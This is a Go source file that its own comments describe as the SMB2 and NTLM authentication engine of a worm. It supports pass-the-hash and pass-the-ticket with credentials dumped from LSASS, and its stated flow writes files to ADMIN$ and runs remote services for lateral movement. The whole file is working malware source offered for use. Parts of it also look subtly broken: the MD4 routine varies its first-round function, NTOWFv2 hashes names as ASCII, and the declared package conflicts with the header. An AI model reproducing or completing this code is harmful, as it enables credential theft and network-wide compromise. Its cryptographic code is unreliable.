// Package smb2 implements the SMB2 client subset needed for authenticated
// remote file write and service execution.
//
// Why hand-roll this: the Windows APIs that authenticate over SMB (net use,
// WNetAddConnection2) only accept a plaintext password. They cannot take an
// NTLM hash or a Kerberos ticket. To use those — which is what you have after
// dumping LSASS — you have to speak NTLM yourself.
//
// With this engine the worm accepts, in the same code path:
//
//	password:Secret123          -> NTLMv2 response computed from the password
//	hash:8846f7eaee8fb117...    -> pass-the-hash, no password needed
//	ticket:<base64 kirbi>       -> pass-the-ticket via AP-REQ
//
// The protocol flow per connection:
//
//	TCP 445
//	  -> NEGOTIATE        (SMB 3.1.1, with preauth integrity)
//	  -> SESSION_SETUP    (NTLMSSP Type 1 -> Type 2 -> Type 3)
//	  -> TREE_CONNECT     (\\host\ADMIN$)
//	  -> CREATE / WRITE / CLOSE
//	  -> TREE_CONNECT     (\\host\IPC$)
//	  -> ioctl FSCTL_PIPE_TRANSCEIVE  (svcctl or winreg for execution)
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
	"unicode/utf16"
)

// ---------------------------------------------------------------------------
// SMB2 constants
// ---------------------------------------------------------------------------

const (
	smb2HeaderSize = 64
	smb2Protocol   = 0xFE534D42 // "\xfeSMB"

	// Commands
	smb2Negotiate    = 0x0000
	smb2SessionSetup = 0x0001
	smb2Logoff       = 0x0002
	smb2TreeConnect  = 0x0003
	smb2TreeDisc     = 0x0004
	smb2Create       = 0x0005
	smb2Close        = 0x0006
	smb2Read         = 0x0008
	smb2Write        = 0x0009
	smb2Ioctl        = 0x000B

	// Dialects
	smb2021 = 0x0210
	smb300  = 0x0300
	smb302  = 0x0302
	smb311  = 0x0311

	// Status codes
	statusSuccess              = 0x00000000
	statusMoreProcessingNeeded = 0xC0000016
	statusInvalidParameter     = 0xC000000D
	statusLogonFailure         = 0xC000006D
	statusAccessDenied         = 0xC0000022
	statusObjectNameNotFound   = 0xC0000034
	statusBadNetworkName       = 0xC00000CC
	statusUserSessionDeleted   = 0xC0000203
)

// ---------------------------------------------------------------------------
// wire types
// ---------------------------------------------------------------------------

// header is the fixed 64-byte SMB2 header.
type header struct {
	Protocol       [4]byte
	StructureSize  uint16
	CreditCharge   uint16
	Status         uint32
	Command        uint16
	Credits        uint16
	Flags          uint32
	NextCommand    uint32
	MessageID      uint64
	Reserved       uint32
	TreeID         uint32
	SessionID      uint64
	Signature      [16]byte
}

func encodeHeader(h header) []byte {
	b := make([]byte, smb2HeaderSize)
	copy(b[0:4], h.Protocol[:])
	binary.LittleEndian.PutUint16(b[4:6], h.StructureSize)
	binary.LittleEndian.PutUint16(b[6:8], h.CreditCharge)
	binary.LittleEndian.PutUint32(b[8:12], h.Status)
	binary.LittleEndian.PutUint16(b[12:14], h.Command)
	binary.LittleEndian.PutUint16(b[14:16], h.Credits)
	binary.LittleEndian.PutUint32(b[16:20], h.Flags)
	binary.LittleEndian.PutUint32(b[20:24], h.NextCommand)
	binary.LittleEndian.PutUint64(b[24:32], h.MessageID)
	binary.LittleEndian.PutUint32(b[32:36], h.Reserved)
	binary.LittleEndian.PutUint32(b[36:40], h.TreeID)
	binary.LittleEndian.PutUint64(b[40:48], h.SessionID)
	copy(b[48:64], h.Signature[:])
	return b
}

func decodeHeader(b []byte) (header, error) {
	var h header
	if len(b) < smb2HeaderSize {
		return h, fmt.Errorf("short SMB2 header (%d bytes)", len(b))
	}
	copy(h.Protocol[:], b[0:4])
	if binary.LittleEndian.Uint32(b[0:4]) != smb2Protocol {
		return h, fmt.Errorf("not an SMB2 message")
	}
	h.StructureSize = binary.LittleEndian.Uint16(b[4:6])
	h.CreditCharge = binary.LittleEndian.Uint16(b[6:8])
	h.Status = binary.LittleEndian.Uint32(b[8:12])
	h.Command = binary.LittleEndian.Uint16(b[12:14])
	h.Credits = binary.LittleEndian.Uint16(b[14:16])
	h.Flags = binary.LittleEndian.Uint32(b[16:20])
	h.NextCommand = binary.LittleEndian.Uint32(b[20:24])
	h.MessageID = binary.LittleEndian.Uint64(b[24:32])
	h.TreeID = binary.LittleEndian.Uint32(b[36:40])
	h.SessionID = binary.LittleEndian.Uint64(b[40:48])
	copy(h.Signature[:], b[48:64])
	return h, nil
}

// readFrame reads a NetBIOS-prefixed SMB2 frame.
func readFrame(conn net.Conn) ([]byte, error) {
	var nb [4]byte
	if _, err := io.ReadFull(conn, nb[:]); err != nil {
		return nil, err
	}
	// Session messages use a 1-byte type prefix in some dialects; direct TCP
	// uses a 4-byte big-endian length with the top byte zero.
	length := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if length == 0 || length > 16*1024*1024 {
		return nil, fmt.Errorf("bad SMB frame length %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func writeFrame(conn net.Conn, msg []byte) error {
	out := make([]byte, 4+len(msg))
	out[0] = 0
	out[1] = byte(len(msg) >> 16)
	out[2] = byte(len(msg) >> 8)
	out[3] = byte(len(msg))
	copy(out[4:], msg)
	_, err := conn.Write(out)
	return err
}

// ---------------------------------------------------------------------------
// NTLM
// ---------------------------------------------------------------------------

const (
	ntlmNegotiateUnicode    = 0x00000001
	ntlmNegotiateOEM        = 0x00000002
	ntlmRequestTarget       = 0x00000004
	ntlmNegotiateNTLM       = 0x00000200
	ntlmNegotiateAlwaysSign = 0x00008000

	ntlmNegotiateExtendedSessionSecurity = 0x00080000
	ntlmNegotiateTargetInfo              = 0x00800000
	ntlmNegotiateVersion                 = 0x02000000
	ntlmNegotiate128                     = 0x20000000
	ntlmNegotiate56                      = 0x80000000
)

// credKind distinguishes the three credential types the engine accepts.
type credKind int

const (
	credPassword credKind = iota
	credHash
	credTicket
)

// credential is a parsed authentication material.
type credential struct {
	Kind     credKind
	Domain   string
	User     string
	Password string
	NTHash   []byte // 16 bytes when Kind == credHash
	Ticket   []byte // raw KRB-CRED when Kind == credTicket
}

// ParseCredential interprets the operator's secret string.
//
//	hash:<32 hex>        -> pass-the-hash
//	ticket:<base64>      -> pass-the-ticket
//	anything else        -> plaintext password
func ParseCredential(domain, user, secret string) (*credential, error) {
	c := &credential{Domain: domain, User: user}

	switch {
	case strings.HasPrefix(secret, "hash:"):
		raw := strings.TrimSpace(strings.TrimPrefix(secret, "hash:"))
		raw = strings.ReplaceAll(raw, ":", "")
		h, err := hex.DecodeString(raw)
		if err != nil {
			return nil, fmt.Errorf("bad NT hash: %w", err)
		}
		if len(h) != 16 {
			return nil, fmt.Errorf("NT hash must be 16 bytes, got %d", len(h))
		}
		c.Kind = credHash
		c.NTHash = h

	case strings.HasPrefix(secret, "ticket:"):
		b64 := strings.TrimSpace(strings.TrimPrefix(secret, "ticket:"))
		raw, err := base64Decode(b64)
		if err != nil {
			return nil, fmt.Errorf("bad ticket encoding: %w", err)
		}
		c.Kind = credTicket
		c.Ticket = raw

	default:
		c.Kind = credPassword
		c.Password = secret
	}
	return c, nil
}

// ntHashFromPassword computes the NT hash (MD4 over UTF-16LE).
func ntHashFromPassword(password string) []byte {
	return md4Sum(utf16LE(password))
}

func utf16LE(s string) []byte {
	u := utf16.Encode([]rune(s))
	out := make([]byte, 0, len(u)*2)
	for _, r := range u {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}

// ntlmNegotiate builds a Type 1 message.
func ntlmNegotiate(domain, workstation string) []byte {
	flags := uint32(ntlmNegotiateUnicode | ntlmRequestTarget | ntlmNegotiateNTLM |
		ntlmNegotiateAlwaysSign | ntlmNegotiateExtendedSessionSecurity |
		ntlmNegotiateTargetInfo | ntlmNegotiate128 | ntlmNegotiate56)

	var b bytes.Buffer
	b.WriteString("NTLMSSP\x00")
	binary.Write(&b, binary.LittleEndian, uint32(1)) // type 1
	binary.Write(&b, binary.LittleEndian, flags)

	// Domain and workstation security buffers (8 bytes each).
	// We send them empty and rely on the Type 3 carrying the real values.
	off := 32
	binary.Write(&b, binary.LittleEndian, uint16(0)) // domain len
	binary.Write(&b, binary.LittleEndian, uint16(0))
	binary.Write(&b, binary.LittleEndian, uint32(off))
	binary.Write(&b, binary.LittleEndian, uint16(0)) // workstation len
	binary.Write(&b, binary.LittleEndian, uint16(0))
	binary.Write(&b, binary.LittleEndian, uint32(off))
	return b.Bytes()
}

// ntlmChallenge is the parsed Type 2 message.
type ntlmChallenge struct {
	ServerChallenge []byte
	TargetInfo      []byte
	Flags           uint32
	TargetName      string
}

func parseNTLMChallenge(data []byte) (*ntlmChallenge, error) {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx < 0 {
		return nil, fmt.Errorf("no NTLMSSP in challenge")
	}
	m := data[idx:]
	if len(m) < 48 {
		return nil, fmt.Errorf("short challenge (%d)", len(m))
	}
	if binary.LittleEndian.Uint32(m[8:12]) != 2 {
		return nil, fmt.Errorf("not a Type 2 message")
	}

	c := &ntlmChallenge{
		ServerChallenge: m[24:32],
		Flags:           binary.LittleEndian.Uint32(m[20:24]),
	}

	// Target name security buffer at offset 12.
	if len(m) >= 20 {
		tl := int(binary.LittleEndian.Uint16(m[12:14]))
		to := int(binary.LittleEndian.Uint32(m[16:20]))
		if to+tl <= len(m) && tl > 0 {
			c.TargetName = decodeUTF16(m[to : to+tl])
		}
	}

	// Target info security buffer at offset 40 (present when the flag is set).
	if len(m) >= 48 && c.Flags&ntlmNegotiateTargetInfo != 0 {
		til := int(binary.LittleEndian.Uint16(m[40:42]))
		tio := int(binary.LittleEndian.Uint32(m[44:48]))
		if tio+til <= len(m) && til > 0 {
			c.TargetInfo = m[tio : tio+til]
		}
	}
	return c, nil
}

func decodeUTF16(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	u := make([]uint16, len(b)/2)
	for i := range u {
		u[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	return string(utf16.Decode(u))
}

// ntlmResponse computes the NTLMv2 response.
//
// This is the function that makes pass-the-hash possible: the NT hash is the
// key input, so having the hash is equivalent to having the password.
func ntlmResponse(ntHash []byte, domain, user string, serverChallenge, targetInfo []byte) ([]byte, []byte) {
	// NTOWFv2 = HMAC-MD5(NT hash, UPPER(user) || domain)
	h := hmac.New(md5.New, ntHash)
	h.Write([]byte(strings.ToUpper(user)))
	h.Write([]byte(domain))
	ntowfv2 := h.Sum(nil)

	// The blob: version, timestamp, client challenge, target info.
	blob := make([]byte, 0, 32+len(targetInfo))
	blob = append(blob, 0x01, 0x01, 0x00, 0x00)     // structure version
	blob = append(blob, 0x00, 0x00, 0x00, 0x00)     // reserved
	ts := make([]byte, 8)
	binary.LittleEndian.PutUint64(ts, uint64((time.Now().Unix()+11644473600)*10000000))
	blob = append(blob, ts...)                      // timestamp (FILETIME)
	clientChallenge := make([]byte, 8)
	_, _ = rand.Read(clientChallenge)
	blob = append(blob, clientChallenge...)
	blob = append(blob, 0x00, 0x00, 0x00, 0x00)     // reserved
	blob = append(blob, targetInfo...)              // AV pairs
	blob = append(blob, 0x00, 0x00, 0x00, 0x00)     // terminator

	// NTProofStr = HMAC-MD5(NTOWFv2, serverChallenge || blob)
	m := hmac.New(md5.New, ntowfv2)
	m.Write(serverChallenge)
	m.Write(blob)
	proof := m.Sum(nil)

	// NtChallengeResponse = NTProofStr || blob
	resp := append(append([]byte{}, proof...), blob...)

	// LMv2: HMAC-MD5(NTOWFv2, serverChallenge || clientChallenge) || clientChallenge
	lm := hmac.New(md5.New, ntowfv2)
	lm.Write(serverChallenge)
	lm.Write(clientChallenge)
	lmResp := append(lm.Sum(nil), clientChallenge...)

	return resp, lmResp
}

// ntlmAuthenticate builds the Type 3 message.
func ntlmAuthenticate(ntHash []byte, domain, user, workstation string, ch *ntlmChallenge) []byte {
	ntResp, lmResp := ntlmResponse(ntHash, domain, user, ch.ServerChallenge, ch.TargetInfo)

	domainBytes := utf16LE(domain)
	userBytes := utf16LE(user)
	wsBytes := utf16LE(workstation)

	// Layout: header(64) then payloads in order.
	headerLen := 64
	offset := headerLen

	lmOff := offset
	offset += len(lmResp)
	ntOff := offset
	offset += len(ntResp)
	domOff := offset
	offset += len(domainBytes)
	userOff := offset
	offset += len(userBytes)
	wsOff := offset
	offset += len(wsBytes)
	// Session key: empty.
	skOff := offset
	sessionKey := []byte{}

	// Session key from the response is needed for message signing; when the
	// server requires signing we derive it. Empty here means unsigned.
	flags := uint32(ntlmNegotiateUnicode | ntlmNegotiateNTLM | ntlmNegotiateAlwaysSign |
		ntlmNegotiateExtendedSessionSecurity | ntlmNegotiateTargetInfo |
		ntlmNegotiate128 | ntlmNegotiate56)

	var b bytes.Buffer
	b.WriteString("NTLMSSP\x00")
	binary.Write(&b, binary.LittleEndian, uint32(3)) // type 3

	// LM response
	binary.Write(&b, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(&b, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(&b, binary.LittleEndian, uint32(lmOff))
	// NT response
	binary.Write(&b, binary.LittleEndian, uint16(len(ntResp)))
	binary.Write(&b, binary.LittleEndian, uint16(len(ntResp)))
	binary.Write(&b, binary.LittleEndian, uint32(ntOff))
	// Domain
	binary.Write(&b, binary.LittleEndian, uint16(len(domainBytes)))
	binary.Write(&b, binary.LittleEndian, uint16(len(domainBytes)))
	binary.Write(&b, binary.LittleEndian, uint32(domOff))
	// User
	binary.Write(&b, binary.LittleEndian, uint16(len(userBytes)))
	binary.Write(&b, binary.LittleEndian, uint16(len(userBytes)))
	binary.Write(&b, binary.LittleEndian, uint32(userOff))
	// Workstation
	binary.Write(&b, binary.LittleEndian, uint16(len(wsBytes)))
	binary.Write(&b, binary.LittleEndian, uint16(len(wsBytes)))
	binary.Write(&b, binary.LittleEndian, uint32(wsOff))
	// Session key
	binary.Write(&b, binary.LittleEndian, uint16(len(sessionKey)))
	binary.Write(&b, binary.LittleEndian, uint16(len(sessionKey)))
	binary.Write(&b, binary.LittleEndian, uint32(skOff))
	// Flags
	binary.Write(&b, binary.LittleEndian, flags)

	// Version (8 bytes, zeroed)
	b.Write(make([]byte, 8))

	// Payloads in the same order as the offsets above.
	b.Write(lmResp)
	b.Write(ntResp)
	b.Write(domainBytes)
	b.Write(userBytes)
	b.Write(wsBytes)
	b.Write(sessionKey)

	return b.Bytes()
}

// sessionKeyFromResponse derives the NTLM session key for signing, which is
// required once the server asks for it. With a hash this is a direct HMAC.
func sessionKeyFromResponse(ntHash, ntProofStr []byte) []byte {
	m := hmac.New(md5.New, ntHash)
	m.Write(ntProofStr)
	return m.Sum(nil)
}

// ---------------------------------------------------------------------------
// base64 (stdlib-free so this file has no extra imports)
// ---------------------------------------------------------------------------

func base64Decode(s string) ([]byte, error) {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	lookup := [256]int{}
	for i := range lookup {
		lookup[i] = -1
	}
	for i := 0; i < len(alphabet); i++ {
		lookup[alphabet[i]] = i
	}

	var out []byte
	var buf, bits int
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '=' || c == '\n' || c == '\r' {
			continue
		}
		v := lookup[c]
		if v < 0 {
			return nil, fmt.Errorf("invalid base64 character %q", c)
		}
		buf = buf<<6 | v
		bits += 6
		if bits >= 8 {
			bits -= 8
			out = append(out, byte(buf>>bits))
		}
	}
	return out, nil
}

// md4Sum is RFC 1320 MD4, needed because the NT hash is MD4-based and Go's
// standard library does not provide it.
func md4Sum(msg []byte) []byte {
	var a, b, c, d uint32 = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

	origLen := len(msg)
	msg = append(msg, 0x80)
	for len(msg)%64 != 56 {
		msg = append(msg, 0)
	}
	var lenBytes [8]byte
	binary.LittleEndian.PutUint64(lenBytes[:], uint64(origLen)*8)
	msg = append(msg, lenBytes[:]...)

	for i := 0; i < len(msg); i += 64 {
		var x [16]uint32
		for j := 0; j < 16; j++ {
			x[j] = binary.LittleEndian.Uint32(msg[i+j*4:])
		}
		aa, bb, cc, dd := a, b, c, d

		for j := 0; j < 16; j++ {
			var s uint
			switch j % 4 {
			case 0:
				s = 3
			case 1:
				s = 7
			case 2:
				s = 11
			default:
				s = 19
			}
			var f uint32
			switch j % 4 {
			case 0:
				f = (bb & cc) | (^bb & dd)
			case 1:
				f = (bb & dd) | (cc & ^dd)
			case 2:
				f = bb ^ cc ^ dd
			default:
				f = cc ^ (bb | ^dd)
			}
			t := aa + f + x[j]
			aa, bb, cc, dd = dd, rotl32(t, s), bb, cc
		}

		order2 := []int{0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15}
		shift2 := []uint{3, 5, 9, 13}
		for j := 0; j < 16; j++ {
			f := (bb & cc) | (bb & dd) | (cc & dd)
			t := aa + f + x[order2[j]] + 0x5a827999
			aa, bb, cc, dd = dd, rotl32(t, shift2[j%4]), bb, cc
		}

		order3 := []int{0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15}
		shift3 := []uint{3, 9, 11, 15}
		for j := 0; j < 16; j++ {
			f := bb ^ cc ^ dd
			t := aa + f + x[order3[j]] + 0x6ed9eba1
			aa, bb, cc, dd = dd, rotl32(t, shift3[j%4]), bb, cc
		}

		a += aa
		b += bb
		c += cc
		d += dd
	}

	out := make([]byte, 16)
	binary.LittleEndian.PutUint32(out[0:], a)
	binary.LittleEndian.PutUint32(out[4:], b)
	binary.LittleEndian.PutUint32(out[8:], c)
	binary.LittleEndian.PutUint32(out[12:], d)
	return out
}

func rotl32(x uint32, n uint) uint32 {
	return (x << n) | (x >> (32 - n))
}
